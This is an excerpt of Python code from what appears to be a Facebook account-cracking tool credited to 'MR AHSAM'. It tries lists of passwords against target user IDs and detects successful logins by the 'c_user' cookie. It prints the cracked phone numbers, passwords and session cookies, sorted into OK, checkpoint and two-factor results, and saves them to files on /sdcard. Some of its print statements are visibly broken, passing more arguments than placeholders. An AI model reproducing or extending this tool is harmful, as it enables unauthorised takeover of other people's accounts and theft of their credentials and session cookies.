...
def checks(oks,cps,twf):
    ...
    if len(cps) != 0:
        ...
        print('\n\n\x1b[1;97m TOTAL OK : \x1b[1;97m %s  \x1b[1;97mAUH-OK.txt' % (
 
            H, P, str(len(oks))))
 
        print('\x1b[1;97m TOTAL CP :\x1b[1;97m   %s \x1b[1;97mAUH-CP.txt' %
 
              (H, P, str(len(cps))))
 
        print('\x1b[1;97m TOTAL 2F :\x1b[1;97m   %s \x1b[1;97mAUH-2F.txt' %
...
def xyz():
    ...
    print('         \x1b[97m[\033[37;41mTHIS COMMAND MADE BY MR AHSAM \033[0;97m] ')
 
    os.system("xdg-open https://www.facebook.com/AHSAM.FATHER.OF.HETARS");print(logo)
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                print('\r\033[1;32m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬[AHSAM-OK❤️]●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\nNUMBER : '+uid+'\nPASSWORD   : '+cid+' Ã¢Ë†Å¡ '+ps+ '\nCOOKIE   : '+coki+'\n●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬')
 
                cek_apk(session,coki)
 
                open('/sdcard/AHSAM-OK.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                print(f'\r\033[1;31m [AHSAM-CP😭] \nNUMBER : '+uid+'\nPASSWORD   : '+ps+ '\n------------------------------------')
 
                open('/sdcard/AHSAM-CP.txt', 'a').write(cid+' | '+ps+'\n')
                ...
                open('/sdcard/AHSAM-2F.txt', 'a').write(cid+' | '+ps+'\n')
        ...
        sys.stdout.write(f'\r\33[1;37m[AHSAM] [%s]\33[1;97m [OK:%s~CP:%s]'%(loop,len(oks),len(cps))), 
